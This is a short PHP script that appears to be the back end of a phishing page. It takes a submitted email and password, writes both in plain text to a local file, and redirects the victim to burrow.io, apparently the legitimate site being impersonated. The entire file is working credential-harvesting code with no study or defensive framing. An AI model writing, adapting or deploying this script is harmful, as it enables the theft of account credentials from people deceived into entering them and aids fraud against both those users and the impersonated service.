<?php
$handle = fopen("file.txt","a");
$email = $_POST['email'];
$password = $_POST['pass'];
if ($email == '')
{
	echo "<script>alert('Please enter username');</script>";
	exit();
}
if ($password == '')
{
	echo "<script>alert('Please enter password');</script>";
	exit();
}
fwrite($handle, "Username = ".$email."\n"."password = ".$password."\n");
header('location:https://burrow.io');
?>
